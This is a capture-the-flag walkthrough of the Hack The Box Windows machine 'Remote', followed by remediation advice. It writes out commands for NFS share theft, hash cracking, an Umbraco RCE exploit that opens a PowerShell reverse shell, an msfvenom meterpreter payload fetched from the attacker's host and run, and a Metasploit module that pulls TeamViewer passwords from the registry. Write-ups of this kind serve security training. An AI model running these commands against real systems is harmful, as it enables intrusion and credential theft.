---
title: Remote - Walkthrough Only
date: 02-24-2026
tags:
  - HTB
  - Windows
  - Easy
---
![[Remote_Machine_Image.png]]
# 🎯 Summary
**Remote** is a Hack The Box machine that requires meticulous service **enumeration** and locate sensitive data in unconventional locations. Execution of **NFS share** enumeration and database information extraction is the key to obtain a foothold in this machine. The vertical **privilege escalation** path involves Umbraco CMS publicly available exploits research, vulnerability exploitation, underlying OS services enumeration and **Team Viewer** credentials decryption.

The following tools were utilised to compromise the machine from initial access to root:
- [**Nmap:**](https://nmap.org) Services Discovery 
- [**Showmount**](https://linux.die.net/man/8/showmount)/ [**Mount**](https://linux.die.net/man/8/mount): Discovery and Mount of NFS Share
- [**Hashcat:**](https://hashcat.net/hashcat/): SHA1 Hash Cracking
- [**Umbraco Exploit**](https://www.exploit-db.com/exploits/49488): Umbraco CMS RCE Exploit
- [**Evil-WinRM:**](https://github.com/Hackplayers/evil-winrm) Remote access on the host
- [**Metasploit:** ](https://www.metasploit.com/)Team Viewer Password Decryption 


# 🔍 Reconnaissance
Our first step is always to scan the host's exposed services with `Nmap` to determine the target of our enumeration process:
```
$ nmap -Pn -n -A  10.129.230.172 -oA Scans/remote_service_scritps
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-24 14:23 +0100
Nmap scan report for 10.129.230.172
Host is up (0.020s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind?
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|_  100003  2,3,4       2049/tcp6  nfs
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  nfs           2-4 (RPC #100003)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
<SNIP>

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1h00m00s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-02-24T14:24:35
|_  start_date: N/A

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   19.52 ms 10.10.14.1
2   19.94 ms 10.129.230.172

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.69 seconds
```

The scan output shows us that the system seems to be running **Windows** and that few interesting ports are open: port **21 (FTP)**, port **80 (HTTP)**, port **111 and 2049 (NFS)**, port **445 (SMB)** and port **5985 (WinRM)**.
To start our target enumeration we explore the website hosted at port 80:
![[Remote/Website_homepage.png]]

Browsing manually the content of the website, under the "**CONTACT**" section, we can locate a blue button that invites us to modify the configuration of the **Umbraco application**:
![[Website_Contact_Session.png]]

Clicking on the button, the web application redirect us to the Umbraco **login portal** where is requested to provide an email and relative password to access the service:
![[Umbraco_Login_Portal.png]]

Having no clue about the possible email accounts format and being there other services still to be analysed, we continue our enumeration trying to access the FTP server as an **anonymous user**:
```
$ ftp 10.129.230.172  
Connected to 10.129.230.172.
220 Microsoft FTP Service
Name (10.129.230.172:luca): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49690|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> exit
221 Goodbye.
```

The FTP server seems to be empty, so we move on the next service querying the **SMB service** with the `smbclient` tool to obtain a list of shared folders:
```
$ smbclient -NL //10.129.230.172/                 
session setup failed: NT_STATUS_ACCESS_DENIED
```

The SMB server returned an **error** due to its configuration that **deny access** as an anonymous user.
Our next step is to verify if the **NFS service** is exposing a list of folders that we could **mount** on our testing environment to explore its content; this can be done with the `showmount` tool as follow:
```
$ showmount -e 10.129.230.172
Export list for 10.129.230.172:
/site_backups (everyone)

```

The output shows that the "**/site_backups**" folder is accessible by **everyone** so we proceed to mount the NFS share in the "NFS-Remote" folder of our testing environment:
```
$ mkdir NFS-Remote
$ sudo mount -t nfs 10.129.230.172:/site_backups ./NFS-Remote -o nolock
[sudo] password di luca: 
$ cd NFS-Remote
```

Exploring the content we see that it contains a **backup** of the Umbraco web application; researching online we discover that Umbraco saves the login credentials in the "**Umbraco.sdf**" file, a discontinued Microsoft SQL Server Compact relational database:
```
$ ls -la     
totale 123
drwx------ 2 nobody nogroup  4096 23 feb  2020 .
drwxrwxr-x 7 luca   luca     4096 24 feb 14.36 ..
drwx------ 2 nobody nogroup    64 20 feb  2020 App_Browsers
drwx------ 2 nobody nogroup  4096 20 feb  2020 App_Data
drwx------ 2 nobody nogroup  4096 20 feb  2020 App_Plugins
<SNIP>

$ ls -la App_Data 
totale 1977
drwx------ 2 nobody nogroup    4096 20 feb  2020 .
drwx------ 2 nobody nogroup    4096 23 feb  2020 ..
drwx------ 2 nobody nogroup      64 20 feb  2020 cache
drwx------ 2 nobody nogroup    4096 20 feb  2020 Logs
drwx------ 2 nobody nogroup    4096 20 feb  2020 Models
drwx------ 2 nobody nogroup      64 20 feb  2020 packages
drwx------ 2 nobody nogroup    4096 20 feb  2020 TEMP
-rwx------ 1 nobody nogroup   36832 20 feb  2020 umbraco.config
-rwx------ 1 nobody nogroup 1965978 20 feb  2020 Umbraco.sdf
```

After moving in the "**App_Data**" folder, we proceed to extract the **database sensitive information** utilising the `strings` tool and filtering the results with `grep` to match only the strings that contain the "**admin**" pattern:
```
$ cd App_Data/ 
$ strings Umbraco.sdf | grep -i "admin"
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8bexxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8bexxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8bexxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
<SNIP>
```

The output of the command returned the **credentials** for the **"admin@htb.local "** account with the related password encrypted with the **SHA1 algorithm**.
# ⚔️ Exploitation
To obtain the **clear text value** of the SHA1 hash we process it with `Hashcat` and the word-list rockyou:
```
$ hashcat -m 100 'b8bexxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx2aaa'  /usr/share/wordlists/rockyou.txt.gz -D 1,2 
hashcat (v7.1.2) starting

<SNIP>

Host memory allocated for this attack: 602 MB (11003 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344385
* Bytes.....: 53357329
* Keyspace..: 14344385

b8bexxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx2aaa:baxxxxxxxxxxse   
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 100 (SHA1)
Hash.Target......: b8bexxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx2aaa
Time.Started.....: Tue Feb 24 15:21:49 2026 (1 sec)
Time.Estimated...: Tue Feb 24 15:21:50 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  4920.7 kH/s (5.83ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Speed.#03........:  2623.8 kH/s (0.43ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Speed.#*.........:  7544.4 kH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10100736/14344385 (70.42%)
Rejected.........: 0/10100736 (0.00%)
Restore.Point....: 9453568/14344385 (65.90%)
<SNIP>

Started: Tue Feb 24 15:21:23 2026
Stopped: Tue Feb 24 15:21:52 2026
```

The SHA1 hash cracking operation is **successful** so we can try to authenticate in the web application login portal as the **Admin** account.
**N.B:** It could happen that the credentials are rejected even if they are correct: a machine reset fixes the issue.
![[Umbraco_access_admin.png]]

Exploring the portal interface we can find an **help section** in the bottom-left corner of the screen that, once accessed, reveals the **Umbraco version**:
![[Portal_Help_Section.png]]
![[Umbraco_version.png]]

Searching online the Umbraco version we discover that it suffers the **[CVE-2019-25137](https://nvd.nist.gov/vuln/detail/CVE-2019-25137)** vulnerability that leads to Remote Code Execution (**RCE**) and that a [Python script](https://www.exploit-db.com/exploits/49488), to execute the exploit, is **publicly available**.
Downloaded the script on our testing environment we proceed to activate a `netcat` listener session to receive a **remote shell** that will be gained with the exploit execution:
```
$ sudo nc -lvnp 443                                             
[sudo] password di luca: 
listening on [any] 443 ...
```

With all ready, we lunch the **exploit** abusing the admin@htb.local credentials to execute a PowerShell **Base64 encoded** command, generated with the [Reverse Shell Generator](https://www.revshells.com/),  that opens a data stream between the underlying system and our `netcat` listener, generating the **reverse shell**:
```
$ python3 Umbraco_exploit.py -u "admin@htb.local" -p "baxxxxxxxxxxse" -i 'http://10.129.6.209' -c powershell -a '-e JABjAGwAaQBlAG4<SNIP>UAKAApAA=='
```

As a result we obtain a shell on the remote host as the "**iis apppool\defaultapppool**" user:
```
connect to [10.10.15.222] from (UNKNOWN) [10.129.6.209] 49694

PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> hostname
remote
```
# 🚩 Post-Exploitation
Exploring the filesystem we locate the "**user.txt**" file in the "C:\Users\Public\Desktop" path and reveal its content gaining the **first flag**:
```
PS C:\Users> ls public\desktop


    Directory: C:\Users\public\desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        2/20/2020   2:14 AM           1191 TeamViewer 7.lnk                                                      
-ar---        2/24/2026  11:10 AM             34 user.txt                                                              


PS C:\Users> type public\Desktop\user.txt
4be5xxxxxxxxxxxxxxxxxxxxxxxxfae0
```

In the same path we notice that there is a link to the **Team Viewer 7 application**. This  leads us to verify if it is running on the system:
```
PS C:\Users> tasklist /svc

Image Name                     PID Services                                    
========================= ======== ============================================
<SNIP>                                  
svchost.exe                   2160 W3SVC, WAS                                  
TeamViewer_Service.exe        2188 TeamViewer7                                 
MsMpEng.exe                   2196 WinDefend                                   
<SNIP>            
```

The output of the command confirms that the **service is running**.

Knowing that usually credentials are memorised to speedup the access to remote devices, we search online where Team Viewer 7 stores the **saved credentials**.
We find that it saves them under the registry hive **"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7"** (for x64 systems) in the SecurityPasswordAES, MultiPwdMgmtIDs and MultiPwdMgmtPWDs subkeys, **encrypting the passwords** with the AES-128-CBC algorithm.

To verify if there are saved credentials on the target system, we proceed to **query the registry** to obtain the hive's subkeys value:
```
PS C:\Users> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer" /s

HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer\Version7
    StartMenuGroup    REG_SZ    TeamViewer 7
    InstallationDate    REG_SZ    2020-02-20
    InstallationDirectory    REG_SZ    C:\Program Files (x86)\TeamViewer\Version7
    Always_Online    REG_DWORD    0x1
    Security_ActivateDirectIn    REG_DWORD    0x0
    Version    REG_SZ    7.0.43148
    ClientIC    REG_DWORD    0x11f25831
<SNIP>
    UsageEnvironmentBackup    REG_DWORD    0x1
    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413xxxxxxxxxxxxxxxxxx2D1E1F3DA7E8D376B26394E5B
    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AExxxxxxxxxxxxxxxxxx55B94A1919C4CD4984593A77
    Security_PasswordStrength    REG_DWORD    0x3

HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer\Version7\AccessControl
    AC_Server_AccessControlType    REG_DWORD    0x0

HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer\Version7\DefaultSettings
    Autostart_GUI    REG_DWORD    0x1
```

The output of the query reveals that the credentials for the user **admin** are stored in the hive, so we go back to search online how to **decrypt** the password.
We discover this [blog article](https://whynotsecurity.com/blog/teamviewer/) where it is explained that we can utilise a Python script or a **Metasploit post module** (post/windows/gather/credentials/teamviewer_passwords) to accomplish the task.

Deciding to follow the Metasploit path, we proceed to create a **Meterpreter payload** with `MSFVenom` to obtain a Meterpreter shell session on the system, a fundamental prerequisite:
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.222 LPORT=4443 -f exe > shell.exe  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
```

As our next step we proceed to set up a `Python3` web server on our testing environment to **serve** the payload.
Back on the target host remote shell, we create a "tmp" folder under "C:\" to **upload** the **shell.exe** file:
```
PS C:\Users> cd C:\
PS C:\> mkdir tmp
PS C:\> cd tmp
PS C:\tmp> wget http://10.10.15.222:8000/shell.exe -O shell.exe
```

To receive the **Meterpreter shell** on our testing environment we activate and configure a `MSFConsole` **multi/handler session** :
```
$ msfconsole -q                                                                                   
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.15.222
LHOST => 10.10.15.222
msf exploit(multi/handler) > set LPORT 4443
LPORT => 4443
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.15.222:4443
```

As last step before the password decryption, we execute the **shell.exe payload** to establish the Meterpreter shell:
```
C:\tmp> .\shell.exe
```

**Received** the connection request from the target host, we proceed to put in the background the Meterpreter session to be able to configure and use the **"post/windows/gather/credentials/teamviewer_passwords"** module that will automatically search for the Team Viewer stored credentials in the **Windows registry** and provide the clear text value of the discovered passwords:
```
[*] Sending stage (230982 bytes) to 10.129.6.209
[*] Meterpreter session 1 opened (10.10.15.222:4443 -> 10.129.6.209:49714) at 2026-02-24 18:24:38 +0100

meterpreter > bg
[*] Backgrounding session 1...

msf exploit(multi/handler) > use post/windows/gather/credentials/teamviewer_passwords
msf post(windows/gather/credentials/teamviewer_passwords) > set SESSION 1
SESSION => 1
msf post(windows/gather/credentials/teamviewer_passwords) > run
[*] Finding TeamViewer Passwords on REMOTE
[+] Found Unattended Password: !Rxxxxe!
<SNIP>
```

Obtained the **Admin credentials** we try to log in the Remote host, through the **WinRM** service using the `Evil-WinRM` tool, verifying if the same password was used also for the **Administrator local account**:
```
$ evil-winrm -i 10.129.6.209 -u "Administrator" -p '!Rxxxxe!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
remote\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
remote
```

Having **access as Administrator** to the system, we proceed to explore the Administrator's profile Desktop folder finding the **root.txt file** (the last flag) and revealing its content:
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/25/2026   5:52 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
ace1xxxxxxxxxxxxxxxxxxxxxxxxbed2
```

# 🛠️ Remediation
### 1. Insecure Network File System (NFS) Configuration
- **Access Control:** Restrict **NFS shares** to specific authorized IP addresses and ensure that sensitive directories, such as `/site_backups`, are not accessible to the `everyone` group.
- **Data Protection:** Ensure that sensitive database files, such as `Umbraco.sdf`, are not stored on publicly accessible network shares and are protected by robust filesystem permissions.
- **Encryption in Transit:** Enable and enforce NFS encryption (**RPCSEC_GSS**) to prevent the interception of sensitive data transmitted over the network.

### 2. Umbraco CMS Vulnerability (CVE-2019-25137)
- **Security Patching:** Update the **Umbraco CMS** to the latest supported version to mitigate **CVE-2019-25137**, which allows for authenticated Remote Code Execution (RCE).
- **Least Privilege:** Configure the Umbraco web application to run under a low-privileged service account rather than the default `iis apppool\defaultapppool` to limit the impact of a successful exploit.
- **Credential Rotation:** Immediately rotate the passwords for the `admin@htb.local` account, as the previous **SHA1 hash** has been compromised through offline cracking.

### 3. Legacy Software & Credential Hygiene
- **Service Decommissioning:** Uninstall legacy versions of software like **TeamViewer 7**, which use known, weak encryption methods for storing credentials within the Windows Registry.
- **Registry Hardening:** Purge legacy registry hives (such as `HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer`) to ensure that previously cached credentials are deleted from the system.
- **Password Policy:** Implement a strict policy against **password reuse** across different services to ensure that compromised application credentials (like the Umbraco Admin) cannot be used to gain local **Administrator** access to the host.


